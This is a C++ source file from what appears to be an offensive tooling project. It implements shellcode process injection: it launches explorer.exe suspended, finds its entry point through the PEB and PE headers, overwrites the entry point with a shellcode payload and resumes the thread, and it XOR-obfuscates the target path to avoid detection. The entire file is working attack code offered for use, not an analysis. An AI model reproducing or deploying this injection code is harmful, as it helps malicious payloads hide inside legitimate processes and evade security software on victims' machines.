// Filename: injector.cpp
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This source file contains functions to inject the payload to a
// remote process on the host machine.


#include "injector.h"
#include "xor.h"

using namespace std;

// Test function to test the shellcode by executing it in-memory.
// Takes the shellcode byte buffer as input.
void executeShellcode(unsigned char* shellcode) {
	int (*func)();
    func = (int (*)()) (void*)shellcode;
    (int)(*func)();
    Sleep(1000);
}

// AddressOfEntryPoint shellcode injection without VirtualAllocEx RWX.
// Takes the shellcode byte buffer and shellcode length as input.
void addressOfEntryPointInjection(unsigned char* shellcode, int shellcode_len) {
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD returnLength = 0;
	char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // CHANGE ME
	// binPath = "c:\\windows\\system32\\explorer.exe"
	char binPath[] = { 0x22, 0x78, 0x1f, 0x33, 0x2c, 0x28, 0x23, 0x27, 0x3e, 0x39, 0x17, 0x3f, 0x34, 0x3d, 0x3b, 0x35, 0x3c, 0x61, 0x61, 0x8, 0x30, 0x2e, 0x27, 0x34, 0x36, 0x28, 0x24, 0x30, 0x6d, 0x21, 0x3d, 0x23 };
	XOR(binPath, sizeof(binPath), key, sizeof(key));
    string sbinPath;
    int len_binPath = sizeof(binPath);
    for (int i = 0; i < len_binPath; i++) { 
        sbinPath = sbinPath + binPath[i]; 
    }
    LPSTR injectbinpath = strdup(sbinPath.c_str());
	CreateProcessA(0, injectbinpath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	// get target image PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	DWORD pebOffset = (uintptr_t)pbi.PebBaseAddress + 8;
	// get target process image base address
	LPVOID imageBase = 0;
	ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL);
	// read target process image headers
	BYTE headersBuffer[4096] = {};
	ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
	LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (uintptr_t)imageBase);
	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, codeEntry, shellcode, shellcode_len, NULL);
	ResumeThread(pi.hThread);
}